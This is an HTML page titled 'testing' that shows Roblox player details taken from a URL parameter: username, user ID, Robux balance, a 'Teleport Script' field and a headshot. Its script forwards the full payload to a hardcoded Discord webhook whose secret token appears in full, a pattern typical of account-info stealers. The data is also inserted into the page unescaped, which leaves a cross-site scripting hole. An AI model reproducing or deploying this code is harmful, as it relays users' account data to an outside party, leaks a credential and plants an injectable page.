<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>testing</title>
</head>
<body>
    <h1>info</h1>
    <div id="player-info"></div>
    <script>
        function sendDataToWebhook(data) {
            const webhookUrl = 'https://discord.com/api/webhooks/1345195939304046663/2v1rOg93RZscRR8CFLN3pnFPARbXxZr9Bhpy1Zv3DWBwOtdy6Kb9dSQhO3Nkcdvqh6gU';

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                console.log('Webhook sent successfully:', data);
            })
            .catch(error => {
                console.error('Error sending webhook:', error);
            });
        }

        const urlParams = new URLSearchParams(window.location.search);
        const data = JSON.parse(decodeURIComponent(urlParams.get('data')));

        const playerInfoDiv = document.getElementById('player-info');
        const embed = data.embeds[0];
        
        playerInfoDiv.innerHTML = `
            <p><strong>Username:</strong> ${embed.fields[0].value}</p>
            <p><strong>UserID:</strong> ${embed.fields[1].value}</p>
            <p><strong>Robux:</strong> ${embed.fields[2].value}</p>
            <p><strong>Teleport Script:</strong> ${embed.footer.text}</p>
            <img src="${embed.thumbnail.url}" alt="Player Headshot">
        `;

        sendDataToWebhook(data);
    </script>
</body>
</html>
